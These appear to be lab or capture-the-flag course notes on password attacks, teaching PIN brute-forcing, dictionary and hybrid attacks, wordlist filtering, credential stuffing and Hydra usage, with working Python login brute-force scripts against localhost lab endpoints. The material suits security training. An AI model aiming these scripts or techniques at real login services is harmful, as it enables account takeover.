Takeaway: Long, complex passwords stay secure even against supercomputers. Short or simple ones fall within minutes to hours.

Practical - Cracking a PIN

Scenario

A target app generates a random 4-digit PIN and exposes a /pin endpoint. A correct PIN returns a success message + flag.

Why This Works

A 4-digit PIN (0000–9999) has only 10,000 possible combinations — trivially small. A simple Python loop can exhaust all possibilities in seconds.

Script: pin-solver.py

import requests

ip = "127.0.0.1"   # Change to your target IP
port = 1234         # Change to your target port

# Try every possible 4-digit PIN (0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"   # Ensures "7" becomes "0007", not just "7"
    print(f"Attempted PIN: {formatted_pin}")

    # Send GET request with the PIN as a query parameter
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # .ok means HTTP 200 (success); check if 'flag' key is in the JSON response
    if response.ok and 'flag' in response.json():
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break   # Stop as soon as we find it

Running It

python pin-solver.py

What the Output Looks Like

...
Attempted PIN: 4051
Attempted PIN: 4052
Correct PIN found: 4053
Flag: HTB{...}

What to Do Next

Once you have the PIN/flag, document the finding. In a real engagement, this demonstrates the target has no rate limiting or lockout mechanism, which is a vulnerability you'd report.

Dictionary Attacks

Why Dictionary Attacks Work

Humans gravitate toward memorable passwords — dictionary words, names, phrases. Despite warnings, many people still use weak passwords. A well-crafted wordlist exploits this human tendency and is far more efficient than pure brute force.

Brute Force vs. Dictionary Attack

Feature Dictionary Attack Brute Force
Efficiency Fast — only tries words from a list Slow — tries every combination
Targeting Highly adaptable — customize list per target No inherent targeting
Effectiveness Excellent against weak/common passwords Effective against all passwords (given enough time)
Limitations Fails against truly random passwords Impractical for long/complex passwords

Key Wordlists

Wordlist Description Source
rockyou.txt Millions of real-world leaked passwords from the RockYou breach Pre-installed on Kali/ParrotOS
top-usernames-shortlist.txt Most common usernames — great for quick attempts SecLists
xato-net-10-million-usernames.txt 10 million usernames for thorough enumeration SecLists
2023-200_most_used_passwords.txt 200 most used passwords as of 2023 SecLists
default-passwords.txt Default creds for routers, devices, software SecLists

🔗 SecLists GitHub: https://github.com/danielmiessler/SecLists

Building Custom Wordlists

  • Publicly available lists — SecLists, rockyou, breach dumps
  • Custom-built lists — Use OSINT (social media, company directories, LinkedIn) about your target
  • Specialized lists — Targeted to specific industries, companies, or individuals
  • Pre-packaged with tools — ParrotOS/Kali include rockyou.txt by default

Practical - Dictionary Attack

Scenario

Target app has a /dictionary route accepting POST requests with a password parameter. Match = success message + flag.

Script: dictionary-solver.py

import requests

ip = "127.0.0.1"   # Change to your target IP
port = 1234         # Change to your target port

# Download the 500 worst passwords list from SecLists and split into lines
passwords = requests.get(
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt"
).text.splitlines()

# Try each password
for password in passwords:
    print(f"Attempted password: {password}")

    # POST request with the password in the form body
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check for HTTP 200 and 'flag' key in response
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break

What the Script Does (Step by Step)

  1. Downloads the wordlist from SecLists via HTTP — no local file needed
  2. Iterates passwords — sends each as a POST request to /dictionary
  3. Analyzes responses — looks for HTTP 200 + flag key in JSON
  4. Stops on success — prints the password and flag, then breaks the loop

Running It

python3 dictionary-solver.py

Sample Output

...
Attempted password: turtle
Attempted password: tiger
Correct password found: [password]
Flag: HTB{...}

Hybrid Attacks

The Problem Hybrid Attacks Exploit

When organizations force password changes, users often just make minor tweaks:

Summer2023  →  Summer2023!
Summer2023  →  Summer2024
Password1   →  Password2

Hybrid attacks combine dictionary attacks with brute-force mutations to catch these predictable patterns.

Hybrid Attack Workflow

  1. Initial dictionary attack — catch weak/common passwords fast
  2. Transition to targeted brute force — take wordlist entries and mutate them (append numbers, special chars, increment years)
  3. Much smaller search space than pure brute force, but covers variations users actually use

Filtering a Wordlist to Match a Password Policy

Download the wordlist

wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/darkweb2017-top10000.txt

Why? We want to start with a large list of common passwords and filter it down to only those that would actually pass the target organization's password policy. No point trying passwords that would be rejected outright.

Step 1: Filter minimum length (8+ characters)

grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
  • ^ = start of line
  • .{8,} = any character, 8 or more times
  • $ = end of line
  • Result: Only passwords with 8+ characters survive

Step 2: Require at least one uppercase letter

grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
  • [A-Z] = any uppercase letter
  • Result: Passwords without an uppercase letter are dropped

Step 3: Require at least one lowercase letter

grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
  • [a-z] = any lowercase letter
  • Result: Further refined list

Step 4: Require at least one number

grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
  • [0-9] = any digit
  • Result: Final filtered list

Check how many remain

wc -l darkweb2017-number.txt
# Output: 89 darkweb2017-number.txt

From 10,000 down to 89 passwords. This drastically reduces the attack time while keeping only passwords that would actually be accepted by the target system.

Credential Stuffing

How It Works

  1. Acquire credentials — from data breaches, phishing, malware, or public wordlists like rockyou
  2. Identify targets — services the victim likely uses (email, banking, social media, e-commerce)
  3. Automated testing — scripts systematically test stolen credentials, mimicking normal user behavior to avoid detection
  4. Unauthorized access — a successful match opens the door to data theft, fraud, further attacks

Why It's So Effective

The root cause is password reuse. A breach on one platform becomes a master key to all platforms where the user recycled the same credentials.

Defense: Strong, unique passwords for every account + multi-factor authentication.

Tool - Hydra

Hydra is a fast, parallel network login cracker that supports a huge number of protocols. It's one of the most widely used tools in penetration testing for brute-forcing authentication.

🔗 GitHub: https://github.com/vanhauser-thc/thc-hydra

Why Hydra?

  • Speed — parallel connections attempt multiple logins simultaneously
  • Flexibility — supports dozens of protocols (SSH, FTP, HTTP, RDP, MySQL, SMTP, VNC, and more)
  • Ease of use — straightforward CLI with clear syntax

Installation

# Check if installed
hydra -h

# Install if missing
sudo apt-get -y update
sudo apt-get -y install hydra

Basic Syntax

hydra [login_options] [password_options] [attack_options] [service_options]

Parameter Reference

Parameter Explanation Example
-l LOGIN Single username hydra -l admin ...
-L FILE File with list of usernames hydra -L usernames.txt ...
-p PASS Single password hydra -p password123 ...
-P FILE File with list of passwords hydra -P passwords.txt ...
-t TASKS Number of parallel threads hydra -t 4 ...
